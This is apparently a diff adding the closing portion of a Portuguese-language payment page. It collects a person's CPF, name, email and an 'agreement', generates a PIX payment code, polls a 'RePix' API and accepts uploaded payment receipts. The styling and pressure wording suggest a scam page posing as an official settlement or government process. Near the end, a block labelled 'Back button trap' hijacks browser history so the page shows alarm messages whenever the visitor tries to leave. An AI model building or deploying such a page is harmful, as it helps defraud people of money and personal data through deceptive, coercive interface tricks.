+        try {
+          sessionStorage.setItem('_pag', JSON.stringify({
+            cpf: CPF, nome: NOME, email: EMAIL, acordo: ACORDO,
+            transactionId: transactionId, copyPaste: pixCode
+          }));
+        } catch (_) {}
+      })
+      .catch(function () {
+        alert('Erro de conexão. Tente novamente.');
+        btn.disabled = false;
+        btn.textContent = 'Confirmar dados e gerar PIX';
+      });
+    });
+
+    document.getElementById('btn-copy').addEventListener('click', function () {
+      var code = document.getElementById('copy-code').textContent;
+      if (!code) return;
+      var done = function () {
+        var b = document.getElementById('btn-copy');
+        b.textContent = '✔ C&oacute;digo copiado!';
+        b.classList.add('copiado');
+        setTimeout(function () { b.textContent = 'Copiar código PIX'; b.classList.remove('copiado'); }, 3000);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(code).then(done).catch(function () {
+          var ta = document.createElement('textarea'); ta.value = code;
+          ta.style.position = 'fixed'; ta.style.left = '-9999px';
+          document.body.appendChild(ta); ta.select();
+          try { document.execCommand('copy'); } catch (_) {}
+          ta.remove(); done();
+        });
+      } else {
+        var ta = document.createElement('textarea'); ta.value = code;
+        ta.style.position = 'fixed'; ta.style.left = '-9999px';
+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand('copy'); } catch (_) {}
+        ta.remove(); done();
+      }
+    });
+
+    document.getElementById('toggle-saiba-mais').addEventListener('click', function () {
+      this.classList.toggle('aberto');
+      document.getElementById('corpo-saiba-mais').classList.toggle('aberto');
+    });
+
+    document.getElementById('banco-tabs').addEventListener('click', function (e) {
+      var tab = e.target.closest('.banco-tab');
+      if (!tab) return;
+      var banco = tab.getAttribute('data-banco');
+      document.querySelectorAll('.banco-tab').forEach(function (t) { t.classList.remove('ativo'); });
+      document.querySelectorAll('.banco-mockup').forEach(function (m) { m.classList.remove('ativo'); });
+      tab.classList.add('ativo');
+      document.getElementById('mock-' + banco).classList.add('ativo');
+    });
+
+    // ===== RePix — Verificar Pagamento =====
+    
+
+    document.getElementById('btn-verificar-pix').addEventListener('click', function () {
+      if (!transactionId) return;
+      var btn = this;
+      btn.disabled = true;
+      var origHTML = btn.innerHTML;
+      btn.textContent = 'Verificando...';
+      fetch(REPIX_API + '/checkout/status/' + encodeURIComponent(transactionId), { cache: 'no-store' })
+        .then(function (r) { return r.json(); })
+        .then(function (d) {
+          if (d.is_paid === true) {
+            pararPolling();
+            btn.textContent = 'Pagamento Confirmado! Redirecionando...';
+            btn.style.background = '#059669'; btn.style.borderColor = '#059669'; btn.style.color = '#fff';
+            document.getElementById('pix-aguardando').style.display = 'none';
+            document.getElementById('countdown-wrap').style.display = 'none';
+            document.querySelector('.pix-copiar').style.display = 'none';
+            document.getElementById('qr-frame').style.display = 'none';
+            document.querySelector('.pix-instrucoes').style.display = 'none';
+            document.querySelector('.pix-valor-grande').style.display = 'none';
+            document.querySelector('.pix-valor-sub').style.display = 'none';
+            document.querySelector('.aviso-atencao').style.display = 'none';
+            document.querySelector('.saiba-mais').style.display = 'none';
+            document.getElementById('pix-sucesso').style.display = 'block';
+            try { var sv = JSON.parse(sessionStorage.getItem('_pag') || '{}'); sv.status = 'PAID'; sessionStorage.setItem('_pag', JSON.stringify(sv)); } catch (_) {}
+            setTimeout(function () { window.location.href = NEXT_URL + window.location.search; }, 1500);
+          } else {
+            btn.disabled = false; btn.innerHTML = origHTML;
+            repixAbrirModal();
+          }
+        })
+        .catch(function () { btn.disabled = false; btn.innerHTML = origHTML; repixAbrirModal(); });
+    });
+
+    function repixAbrirModal() {
+      document.getElementById('repix-overlay').classList.add('ativo');
+      repixResetar();
+    }
+    function repixFecharModal() { document.getElementById('repix-overlay').classList.remove('ativo'); }
+    function repixResetar() {
+      document.getElementById('repix-upload-step').style.display = 'block';
+      document.getElementById('repix-loader').style.display = 'none';
+      document.getElementById('repix-resultado').style.display = 'none';
+      document.getElementById('repix-resultado').className = 'repix-resultado';
+      document.getElementById('repix-arquivo').className = 'repix-arquivo';
+      document.getElementById('repix-file').value = '';
+      document.getElementById('btn-validar-ia').disabled = true;
+    }
+
+    document.getElementById('repix-close-x').addEventListener('click', repixFecharModal);
+    document.getElementById('repix-overlay').addEventListener('click', function (e) { if (e.target === this) repixFecharModal(); });
+
+    var rpxFile = document.getElementById('repix-file');
+    var rpxArea = document.getElementById('repix-upload-area');
+    rpxFile.addEventListener('change', function () {
+      var f = this.files[0]; if (!f) return;
+      if (f.size > 10 * 1024 * 1024) { alert('Arquivo muito grande. Máximo 10MB.'); this.value = ''; return; }
+      document.getElementById('repix-arquivo-nome').textContent = f.name;
+      document.getElementById('repix-arquivo').className = 'repix-arquivo vis';
+      document.getElementById('btn-validar-ia').disabled = false;
+    });
+    document.getElementById('repix-arquivo-trocar').addEventListener('click', function () {
+      rpxFile.value = ''; document.getElementById('repix-arquivo').className = 'repix-arquivo';
+      document.getElementById('btn-validar-ia').disabled = true;
+    });
+    rpxArea.addEventListener('dragover', function (e) { e.preventDefault(); this.classList.add('drag-over'); });
+    rpxArea.addEventListener('dragleave', function () { this.classList.remove('drag-over'); });
+    rpxArea.addEventListener('drop', function (e) {
+      e.preventDefault(); this.classList.remove('drag-over');
+      if (e.dataTransfer.files.length) { rpxFile.files = e.dataTransfer.files; rpxFile.dispatchEvent(new Event('change')); }
+    });
+
+    document.getElementById('btn-validar-ia').addEventListener('click', function () {
+      if (!transactionId || !rpxFile.files.length) return;
+      var btn = this; btn.disabled = true;
+      document.getElementById('repix-upload-step').style.display = 'none';
+      document.getElementById('repix-loader').style.display = 'block';
+      var fd = new FormData(); fd.append('file', rpxFile.files[0]);
+      fetch(REPIX_API + '/transactions/' + encodeURIComponent(transactionId) + '/proof', { method: 'POST', body: fd })
+        .then(function (r) {
+          if (r.ok) return r.json().then(function (d) { return { ok: true, data: d }; });
+          if (r.status === 400) return r.json().then(function (d) { return { ok: false, data: d }; });
+          throw new Error('Erro ' + r.status);
+        })
+        .then(function (result) {
+          document.getElementById('repix-loader').style.display = 'none';
+          var res = document.getElementById('repix-resultado');
+          res.style.display = 'block';
+          if (result.ok && result.data.success === true) {
+            res.className = 'repix-resultado sucesso';
+            document.getElementById('repix-resultado-ico').innerHTML = '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>';
+            document.getElementById('repix-resultado-titulo').textContent = 'Comprovante validado e aprovado com sucesso!';
+            document.getElementById('repix-resultado-msg').textContent = 'Liberando acesso...';
+            document.getElementById('repix-resultado-acoes').innerHTML = '';
+            pararPolling();
+            try { var sv = JSON.parse(sessionStorage.getItem('_pag') || '{}'); sv.status = 'PAID'; sessionStorage.setItem('_pag', JSON.stringify(sv)); } catch (_) {}
+            setTimeout(function () { window.location.href = NEXT_URL + window.location.search; }, 1000);
+          } else {
+            res.className = 'repix-resultado erro';
+            document.getElementById('repix-resultado-ico').innerHTML = '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#d92c2c" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>';
+            document.getElementById('repix-resultado-titulo').textContent = 'Comprovante não aprovado';
+            var msg = (result.data && (result.data.detail || result.data.message)) || 'O comprovante enviado não pôde ser validado. Tente enviar o arquivo correto.';
+            document.getElementById('repix-resultado-msg').textContent = msg;
+            document.getElementById('repix-resultado-acoes').innerHTML = '<button type="button" class="repix-tentar-novamente" id="repix-tentar-btn">Tentar novamente</button>';
+            document.getElementById('repix-tentar-btn').addEventListener('click', repixResetar);
+          }
+        })
+        .catch(function () {
+          document.getElementById('repix-loader').style.display = 'none';
+          document.getElementById('repix-upload-step').style.display = 'block';
+          btn.disabled = false;
+          alert('Erro de conexão ao validar comprovante. Tente novamente.');
+        });
+    });
+  })();
+  </script>
+
+  <!-- Back button trap -->
+  <div id="__br1" style="display:none;position:fixed;inset:0;z-index:9999;background:var(--cinza-bg);align-items:center;justify-content:center;font-family:'Open Sans',sans-serif"><div style="background:#fff;border-radius:14px;box-shadow:0 4px 20px rgba(0,0,0,.1);padding:32px 24px;max-width:420px;width:100%;text-align:center;margin:16px"><div style="font-size:48px;margin-bottom:16px">&#9888;&#65039;</div><h2 style="font-size:20px;color:#1a1a1a;margin:0 0 8px">Espere! Seu processo está em andamento</h2><p style="font-size:14px;color:#666;line-height:1.6;margin:0 0 20px">Se você sair agora, todo o progresso será perdido e será necessário reiniciar desde o início.</p><button onclick="document.getElementById('__br1').style.display='none'" style="display:inline-block;background:#1351B4;color:#fff;border:none;padding:14px 28px;border-radius:999px;font-weight:700;font-size:14px;cursor:pointer;font-family:inherit">Continuar processo</button></div></div>
+  <div id="__br2" style="display:none;position:fixed;inset:0;z-index:9999;background:var(--cinza-bg);align-items:center;justify-content:center;font-family:'Open Sans',sans-serif"><div style="background:#fff;border-radius:14px;box-shadow:0 4px 20px rgba(0,0,0,.1);padding:32px 24px;max-width:420px;width:100%;text-align:center;margin:16px"><div style="font-size:48px;margin-bottom:16px">&#9888;&#65039;</div><h2 style="font-size:20px;color:#1a1a1a;margin:0 0 8px">Última chance!</h2><p style="font-size:14px;color:#666;line-height:1.6;margin:0 0 20px">Ao sair, sua solicitação será cancelada e as condições atuais podem não estar mais disponíveis.</p><button onclick="document.getElementById('__br2').style.display='none'" style="display:inline-block;background:#1351B4;color:#fff;border:none;padding:14px 28px;border-radius:999px;font-weight:700;font-size:14px;cursor:pointer;font-family:inherit">Permanecer na página</button></div></div>
+  <script>(function(){var a=0;history.pushState({_br:1},'');window.addEventListener('popstate',function(){a++;document.getElementById(a===1?'__br1':'__br2').style.display='flex';history.pushState({_br:1},'')})})();</script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"193fac0767f54161a1e0e9be8dfbaa2e","r":1,"spa":2}' crossorigin="anonymous"></script>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a46b9d71aebf6348',t:'MTc5MTM2MjU3Mw=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
